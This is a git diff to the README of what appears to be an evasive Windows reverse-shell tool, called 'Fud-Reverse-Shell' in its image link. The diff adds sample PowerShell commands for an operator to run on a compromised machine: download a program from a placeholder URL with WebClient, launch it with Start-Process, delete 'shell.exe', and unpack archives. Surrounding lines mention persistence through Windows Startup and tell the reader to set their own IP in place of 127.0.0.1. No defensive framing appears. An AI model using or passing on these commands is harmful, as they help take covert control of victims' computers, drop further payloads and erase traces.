@@ -1,7 +1,30 @@
 ## Setup:
 <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Fud-Reverse-Shell/main/img/ss.png"></img>
 
+```diff
+» sample commands
 
+» if you want to know username and file location name type pwd
+
+
+» Extract from Zip: Expand-Archive -Path C:\Users\{Username}\Downloads\lol.zip -DestinationPath C:\Users\{Username}\Downloads\3162
+
+
+» creates new folder: New-Item -ItemType Directory -Path "C:\Users\{Username}\Downloads\New Folder"
+
+
+» app deletes: Remove-Item "C:\Users\{Username}\Downloads\shell.exe"
+
+
+» The program downloads: powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://YourDownloadLink/program.exe', 'C:\Users\{Username}\Downloads\Program.exe')"
+
+
+
+» Runs the program: powershell -c "Start-Process C:\Users\{Username}\Downloads\downloaded_file.exe"
+
+
+» Copies the file from one place to another: scp C:\Users\Administrator\Downloads\program.exe C:\Users\Administrator\Desktop\program.exe
+```
 » Reverse shell + Windows Startup
 
 » Change the 127.0.0.1 ip address in the codes according to yourself
